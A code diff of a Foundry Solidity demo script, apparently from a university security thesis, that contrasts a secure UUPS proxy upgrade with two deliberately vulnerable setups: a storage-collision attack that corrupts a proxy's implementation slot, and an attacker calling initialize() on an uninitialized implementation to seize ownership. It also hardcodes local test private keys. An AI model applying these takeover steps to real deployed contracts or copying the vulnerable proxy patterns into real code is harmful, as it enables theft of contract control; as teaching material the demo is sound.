@@ -10,18 +10,18 @@ import "../src/secure/SecureLogicV2.sol";
 import "../src/secure/SecureProxy.sol";
 
 /**
- * @title PresentationDemo
+ * @title AllDemo
  * @notice Complete presentation demo: Normal flow + Attack scenarios
- * @dev Run: forge script script/PresentationDemo.s.sol --rpc-url http://localhost:8545 --broadcast -vvv
+ * @dev Run: forge script script/AllDemo.s.sol --rpc-url http://localhost:8545 --broadcast -vvv
  */
-contract PresentationDemo is Script {
+contract AllDemo is Script {
     function run() external {
         uint256 deployerKey = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
         uint256 attackerKey = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d;
-        
+
         address deployer = vm.addr(deployerKey);
         address attacker = vm.addr(attackerKey);
-        
+
         console.log("");
         console.log("################################################################");
         console.log("#          USC SECURITY THESIS - PRESENTATION DEMO            #");
@@ -29,110 +29,106 @@ contract PresentationDemo is Script {
         console.log("");
         console.log("Deployer (Admin):", deployer);
         console.log("Attacker:", attacker);
-        
+
         // PART 1: SECURE UPGRADE FLOW
         _demoSecureFlow(deployerKey, deployer);
-        
+
         // PART 2: STORAGE COLLISION ATTACK
         _demoStorageCollision(deployerKey);
-        
+
         // PART 3: UNINITIALIZED IMPLEMENTATION ATTACK
         _demoUninitializedAttack(deployerKey, attackerKey, attacker);
     }
-    
+
     function _demoSecureFlow(uint256 deployerKey, address deployer) internal {
         console.log("");
         console.log("================================================================");
         console.log("  PART 1: SECURE UUPS UPGRADE FLOW");
         console.log("================================================================");
-        
+
         vm.startBroadcast(deployerKey);
-        
+
         // Step 1: Deploy
         SecureLogicV1 implV1 = new SecureLogicV1();
         bytes memory initData = abi.encodeCall(SecureLogicV1.initialize, (deployer));
         SecureProxy proxy = new SecureProxy(address(implV1), initData);
         console.log("[STEP 1] Deployed V1 + Proxy");
         console.log("  Proxy:", address(proxy));
-        
+
         // Step 2: Interact
         SecureLogicV1 proxyV1 = SecureLogicV1(address(proxy));
         proxyV1.setValue(42);
         proxyV1.increment();
         console.log("[STEP 2] setValue(42) + increment()");
         console.log("  Value before upgrade:", proxyV1.value());
-        
+
         // Step 3: Upgrade
         SecureLogicV2 implV2 = new SecureLogicV2();
         bytes memory reinitData = abi.encodeCall(SecureLogicV2.initializeV2, ());
         proxyV1.upgradeToAndCall(address(implV2), reinitData);
         console.log("[STEP 3] Upgraded to V2");
-        
+
         // Step 4: Verify
         SecureLogicV2 proxyV2 = SecureLogicV2(address(proxy));
         console.log("[STEP 4] Verify state preservation");
         console.log("  Version:", proxyV2.version());
         console.log("  Value after upgrade:", proxyV2.value());
         console.log("  *** STATE PRESERVED! ***");
-        
+
         vm.stopBroadcast();
     }
-    
+
     function _demoStorageCollision(uint256 deployerKey) internal {
         console.log("");
         console.log("================================================================");
         console.log("  PART 2: STORAGE COLLISION ATTACK");
         console.log("================================================================");
-        
+
         vm.startBroadcast(deployerKey);
-        
+
         VulnerableLogicV1 vulnV1 = new VulnerableLogicV1();
         BadProxy badProxy = new BadProxy(address(vulnV1));
         console.log("[SETUP] BadProxy deployed");
         console.log("  Implementation (slot 0):", badProxy.implementation());
-        
+
         VulnerableLogicV2 vulnV2 = new VulnerableLogicV2();
         badProxy.upgradeTo(address(vulnV2));
         console.log("[ATTACK] Upgraded to V2");
-        
+
         VulnerableLogicV2(address(badProxy)).setCollisionVar(9999);
         console.log("[ATTACK] Called setCollisionVar(9999)");
-        
+
         console.log("[RESULT] Implementation now:", badProxy.implementation());
         console.log("  *** PROXY CORRUPTED! Points to 0x270f (9999) ***");
-        
+
         vm.stopBroadcast();
     }
-    
-    function _demoUninitializedAttack(
-        uint256 deployerKey, 
-        uint256 attackerKey,
-        address attacker
-    ) internal {
+
+    function _demoUninitializedAttack(uint256 deployerKey, uint256 attackerKey, address attacker) internal {
         console.log("");
         console.log("================================================================");
         console.log("  PART 3: UNINITIALIZED IMPLEMENTATION ATTACK");
         console.log("================================================================");
-        
+
         vm.startBroadcast(deployerKey);
         VulnerableLogicV1 vulnImpl = new VulnerableLogicV1();
         console.log("[SETUP] VulnerableLogicV1 deployed");
         console.log("  Owner before:", vulnImpl.owner());
         vm.stopBroadcast();
-        
+
         vm.startBroadcast(attackerKey);
         vulnImpl.initialize();
         console.log("[ATTACK] Attacker called initialize()");
         console.log("  Owner after:", vulnImpl.owner());
         console.log("  *** ATTACKER IS NOW OWNER! ***");
         vm.stopBroadcast();
-        
+
         vm.startBroadcast(deployerKey);
         SecureLogicV1 secureImpl = new SecureLogicV1();
         console.log("[SECURE] SecureLogicV1 deployed");
         console.log("  _disableInitializers() blocks attack");
         vm.stopBroadcast();
-        
+
         console.log("");
         console.log("################################################################");
         console.log("#                    DEMO COMPLETE                            #");
